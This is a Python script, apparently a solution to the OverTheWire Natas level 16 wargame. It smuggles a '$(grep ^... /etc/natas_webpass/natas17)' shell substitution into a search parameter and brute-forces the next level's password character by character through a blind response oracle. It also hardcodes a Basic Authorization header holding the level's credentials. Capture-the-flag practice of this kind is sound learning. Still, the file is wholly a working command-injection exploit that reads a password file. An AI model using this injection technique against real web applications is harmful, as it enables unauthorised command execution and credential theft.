#!/bin/python3
import requests
import string
import sys

ascii_chars = string.digits
ascii_chars += string.ascii_letters

session = requests.session()

print("Your key for natas17 is: ")
burp0_url_0 = '$(grep ^'
for i in range(1,33):
    for eachchar in range(0,len(ascii_chars)):
        asciichar = ascii_chars[eachchar]
        burp0_url_1 = burp0_url_0 + '%s /etc/natas_webpass/natas17)dankest' %asciichar
        #print(burp0_url_1)
        burp0_url = "http://natas16.natas.labs.overthewire.org:80/?needle=" + requests.utils.quote(burp0_url_1) + "&submit=Search"
        burp0_headers = {"Cache-Control": "max-age=0", "Authorization": "Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA==", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9,ja;q=0.8", "Connection": "close"}

        response = session.get(burp0_url, headers=burp0_headers)
        if "dankest" not in response.text:
            burp0_url_0 += asciichar
            print(asciichar, end= '')
            sys.stdout.flush()
            break
